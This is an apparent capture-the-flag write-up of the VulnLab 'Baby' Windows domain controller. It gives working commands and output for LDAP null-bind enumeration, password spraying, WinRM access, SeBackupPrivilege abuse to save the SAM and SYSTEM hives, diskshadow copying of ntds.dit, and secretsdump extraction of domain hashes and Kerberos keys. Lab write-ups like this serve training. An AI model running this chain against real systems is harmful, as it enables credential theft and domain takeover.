---
title: "Vulnlab : Baby Easy"
date: 2025-10-12T21:07:38+02:00
draft: false
toc: false
images:
tags:
  - misc
---

This is a writeup for the VulnLab Baby easy machine. We'll be dealing with a Windows environment where we'll need to use LDAP enumeration and the password spraying technique.
## Reconnaissance

A first scan with nmap shows us the following ports:
```bash
[Oct 12, 2025 - 21:17:10 (CEST)] exegol-vulnlab /workspace # nmap -sSV --top-ports=1000 10.10.117.161
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-12 21:17 CEST
Nmap scan report for 10.10.117.161
Host is up (0.027s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-12 19:17:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We're dealing with an Active Directory environment.

We'll start by checking if anonymous bind to LDAP is possible, using the ldapsearch command:
```bash
[Oct 12, 2025 - 21:22:36 (CEST)] exegol-vulnlab /workspace # ldapsearch -x -H ldap://baby.vl:3268 -b "DC=baby,DC=vl" "(objectClass=user)" | grep dn
dn: CN=Guest,CN=Users,DC=baby,DC=vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

Indeed, null bind is enabled, so we retrieve a list of users. The next step is to check the description field, which may contain sensitive information:
```bash
[Oct 12, 2025 - 21:24:29 (CEST)] exegol-vulnlab /workspace # ldapsearch -x -H ldap://baby.vl:3268 -b "DC=baby,DC=vl" "(objectClass=user)" | grep desc
description: Built-in account for guest access to the computer/domain
description: Set initial password to BabyStart123!
```

Bam! A password!

This password is in Teresa's description. Let's verify if it works:
```bash
[Oct 12, 2025 - 21:26:45 (CEST)] exegol-vulnlab /workspace # nxc smb 10.10.117.161 -u teresa.bell -p 'BabyStart123!' --no-bruteforce
SMB         10.10.117.161   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.117.161   445    BABYDC           [-] baby.vl\teresa.bell:BabyStart123! STATUS_LOGON_FAILURE
```
## User Flag

#### Password Spraying

It doesn't work for this user, so we'll generate a user list from the ones we retrieved with LDAP to perform password spraying:
```bash
[Oct 12, 2025 - 21:32:23 (CEST)] exegol-vulnlab /workspace # nxc smb 10.10.117.161 -u users_list.txt -p 'BabyStart123!' --no-bruteforce
SMB         10.10.117.161   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.117.161   445    BABYDC           [-] baby.vl\guest:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.117.161   445    BABYDC           [-] baby.vl\jacqueline.barnett:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.117.161   445    BABYDC           [-] baby.vl\ashley.webb:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.117.161   445    BABYDC           [-] baby.vl\hugh.george:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.117.161   445    BABYDC           [-] baby.vl\leonard.dyer:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.117.161   445    BABYDC           [-] baby.vl\connor.wilkinson:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.117.161   445    BABYDC           [-] baby.vl\joseph.hughes:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.117.161   445    BABYDC           [-] baby.vl\kerry.wilson:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.117.161   445    BABYDC           [-] baby.vl\teresa.bell:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.117.161   445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

Ok! We have Caroline who needs to have her password BabyStart123! changed:
```bash
[Oct 12, 2025 - 21:34:05 (CEST)] exegol-vulnlab /workspace # smbpasswd -r 10.10.117.161 -U "Caroline.Robinson"
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson on 10.10.117.161.
```

Now, we'll connect with WinRM using Caroline's credentials:
```bash
**[Oct 12, 2025 - 21:35:37 (CEST)] exegol-vulnlab /workspace # evil-winrm -i 10.10.117.161 -u 'caroline.robinson' -p 'Test123'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
```

We get the user flag:
```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> cat "C:/Users/Caroline.Robinson/Desktop/user.txt"
VL{b2c6150b85125d32f4b253df9540d898}
```
## Administrator Flag

#### Privilege Escalation

With `whoami /all` we can see Caroline's privileges, and we can see that she has SeRestore and SeBackupPrivilege privileges:
```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.**
```

This will allow us to dump the SAM and SYSTEM hives to retrieve passwords and escalate our privileges:
```bash
*Evil-WinRM* PS C:\Temp> reg save hklm\sam c:\Temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system
The operation completed successfully.
*Evil-WinRM* PS C:\Temp> download sam

*Evil-WinRM* PS C:\Temp> download system
```

Then with secretsdump we can obtain the administrator hash:
```bash
[Oct 12, 2025 - 21:43:10 (CEST)] exegol-vulnlab /workspace # secretsdump -sam sam -system system LOCAL
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

Unfortunately, we cannot use this hash because it's for the local administrator, so we cannot use it to connect to the domain controller. We therefore need to obtain a hash for a domain account. To do this, we'll need to dump the ntds.dit database using the Volume Shadow Copy technique. We'll use the following script:
```bash
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

```bash
diskshadow /s script.txt

robocopy /b E:\Windows\ntds . ntds.dit

download ntds.dit
```

Then, locally we can extract the hashes:
```bash
[Oct 12, 2025 - 21:57:53 (CEST)] exegol-vulnlab /workspace # secretsdump -ntds ntds.dit -system system LOCAL
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:697f4174d13d804a333879a9410d1ec8:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:3b1da22b1973c0bb86d4a9b6a9ae65f6:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
```

We can then connect with the Administrator account and its hash to get the flag:
```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat "C:/Users/Administrator/Desktop/root.txt"
VL{9000cab96bcf62e99073ff5f6653ce90}
```
